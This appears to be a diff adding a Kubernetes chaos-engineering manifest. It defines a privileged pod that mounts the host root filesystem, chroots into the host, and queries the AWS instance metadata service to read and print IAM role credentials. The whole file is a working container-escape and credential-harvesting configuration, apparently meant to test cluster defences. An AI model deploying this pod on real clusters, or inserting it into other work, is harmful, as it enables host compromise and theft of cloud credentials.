@@ -1,0 +1,29 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+ name: chaos
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: chaos-priv-pod-aws-tokens
+  namespace: chaos
+  labels:
+    chaoskube: privpod 
+spec:
+  containers:
+  - name: priv-pod
+    image: ubuntu
+    securityContext:
+      privileged: true
+      #command: [ "/bin/bash", "-c", "--"]
+    command: [ "chroot", "/chroot", "/bin/bash", "-c"]
+    args: [ "ROLE=$(curl -s 169.254.169.254/latest/meta-data/iam/security-credentials); CREDS=$(curl -s 169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE); echo $CREDS; sleep 3600" ]
+    volumeMounts:
+    - mountPath: /chroot
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
